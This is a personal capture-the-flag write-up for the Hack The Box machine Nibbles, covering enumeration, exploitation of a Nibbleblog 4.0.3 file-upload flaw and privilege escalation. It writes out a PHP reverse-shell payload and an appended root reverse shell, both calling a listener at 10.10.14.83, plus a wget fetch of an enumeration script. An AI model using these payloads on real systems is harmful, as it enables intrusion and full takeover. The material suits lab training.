# Nibbles Write-Up

## Table of Contents

* [Overview](#overview)
* [Enumeration](#enumeration)
* [Footprinting](#footprinting)
* [Initial Foothold](#initialfoothold)
* [Privilege Escalation](#privilegeescalation)

### Overview

This is a write-up on Nibbles, there are 2 identifiable methods of exploitation. 1 with metasploit and 1 without. This serves as an experience and knowledge bank for me! <br>
The vulnerability to be exploited is __CVE-2015-6967: Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)__<br>
It allows an authenticated attacker to exploit an arbitrary file upload flaw, enabling the execution of malicious PHP code on the server. <br>
This vulnerability is particularly dangerous as it can lead to remote code execution which will be demonstrated below. <br>

### Enumeration

The first step is to get an idea of the available open ports and the services running. <br>
We run a basic `nmap` scan to see if we get any hits. <br>
<br>
![scan](images/nmap_initial_scan.png) <br>
<br>
We see that the host has ports 22 & 80 open, which happen to be running the services SSH & HTTP respectively. <br>
They also are running `OpenSSH` and `Apache`, on a `Ubuntu Linux` OS. <br>

Let's run a full tcp scan with `nmap` to scan all 65,535 ports, to identify any other ports/services. <br>

This will take a while, so after moving it to the background, we can do some banner grabbing to move on with our enumeration. <br>
<br>
![bannergrab](images/banner_grab_port_22.png) <br>
![bannergrab](images/banner_grab_port_80.png) <br>
<br>
Using `nc` to perform banner grabbing, we can confirm the `nmap` results that the target is running an `Apache` web server and an `OpenSSH` server. <br>
Checking our `nmap` scan, we can see that the full port scan did not find any additional ports. <br>

![scan](images/nmap_full_tcp_scan.png) <br>

Let's try to run an `nmap` script scan to uncover anything else. <br>
This runs relatively quickly because we specify the only 2 open ports on the target. <br>
<br>
![scan](images/nmap_script_scan.png) <br>
<br>
Let's also try to enumerate common web application directories using the `http-enum` script. <br>
<br>
![scan](images/nmap_http_enum.png) <br>
<br>
We can see that both of these scans did not help us identify anything useful. <br>

### Footprinting

I tried to `curl` the target ip to see what is returned from the page. <br>
<br>
![curl](images/curl_target.png) <br>
<br>
The comments in the html mentions a directory named nibbleblog. <br>
Using `whatweb`, we identify the web application in use. <br>
<br>
![whatweb](images/whatweb_target_nibbleblog.png) <br>
<br>
Now, we can see that it's using `HTML5`, `jQuery` and `PHP`. The blogging engine seems to be `Nibbleblog`. <br>
<br>
![nibbleblog](images/nibbleblog.png) <br>
<br>
We don't find anything interesting in the /nibbleblog directory in Firefox. <br>
Let's try to use `Gobuster` to check for other accessible pages or directories. <br>
<br>
![gobuster](images/gobuster_nibbleblog.png) <br>
<br>
We see that the admin.php page is present, there is also a `README` page available. <br>
By curling the `README` page, we identify: <br>
<br>
![readme](images/curl_target_readme.png) <br>
<br>

the version of `Nibbleblog: v4.0.3` <br>

After revisiting the `Gobuster` output, I noticed that there are Status 301 codes in `/content` & `/plugins` <br>
We visit the `/content` page to see if there's anything useful. <br>
<br>
![content](images/nibbleblog_content.png) <br>
<br>
There are 3 folders, after further exploring: <br>
<br>
![content](images/nibbleblog_content_private.png) <br>
![content](images/nibbleblog_content_private_usersxml.png) <br>
![content](images/nibbleblog_content_private_configxml.png) <br>
<br>
We confirm that there is a username `admin`. There is also a blacklist of repeated attempts more than 5. By pure guessing, we discover the password is the name of the box. <br>
We are in!
<br>
![content](images/nibbleblog_admin.png) <br>
<br>

### InitialFoothold

We explore further, to see what we can do with all of these directories. <br>
<br>
![content](images/nibbleblog_admin_plugin.png) <br>
![content](images/nibbleblog_admin_plugin_rcetest.png) <br>
![content](images/nibbleblog_admin_plugin_rcesuccess.png) <br>
<br>




We will use the following `Bash` reverse shell and upload it. <br>
`<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.83 9443 >/tmp/f");?>`


Now, we `curl` the image page again to execute it. <br>
We can also just navigate to this directory that has stored the image to run the remote code. <br>
<br>
![content](images/nibbleblog_content_private_plugins.png) <br>
![content](images/nibbleblog_content_private_plugins_image.png) <br>
<br>


We have a reverse shell! <br>
We use `python3 -c 'import pty; pty.spawn("/bin/bash")'` to get us a more intuitive shell <br>
<br>
![content](images/nc_success.png) <br> 
<br>
We discover the `user` flag after navigating to the home directory. <br>
<br>
![content](images/user_flag.png) <br>
<br>


### PrivilegeEscalation

We also see a `personal.zip`, lets unzip it and have a look at its contents. We find a file that tells us how to run an application. <br>
There's nothing interesting to note here. I moved on to try something else. <br>
<br>
![privilegeesc](images/unzip_personal.png) <br>
<br>
Next, by using `LinEnum.sh` from [GitHub]([https://github.com](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) "LinEnum.sh") <br>
we host a `Python` HTTP server on our host by using `sudo python3 -m http.server 8080` to download the script to our target. <br>
Then, from the target, we execute `wget http://10.10.14.83:8080/LinEnum.sh` to retrieve it from the hosted server. We should see a 200 success response on our `Python` HTTP server. <br>
Next, we make the script executable and run it.
<br>
![privilegeesc](images/lin_enum_exec.png) <br>
<br>
I noticed some interesting output! <br>
<br>
![privilegeesc](images/lin_enum.png) <br>
<br>

We have sudo privileges on `/home/nibbler/personal/stuff/monitor.sh`. If we append a reverse shell to the end of it, we can potentially get a reverse shell back as the root user. <br>
Let's append a reverse shell to it by `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.83 8443 >/tmp/f' | tee -a monitor.sh` <br>
Now we can run the script with `sudo` <br>
<br>
![privilegeesc](images/append_reverse_shell.png) <br>
<br>
Our listener on another terminal gets a connection, and we get root!!! We move to the home directory and see a `flag`. We have successfully gained root!
<br>
![privilegeesc](images/root_flag.png) <br>
<br>
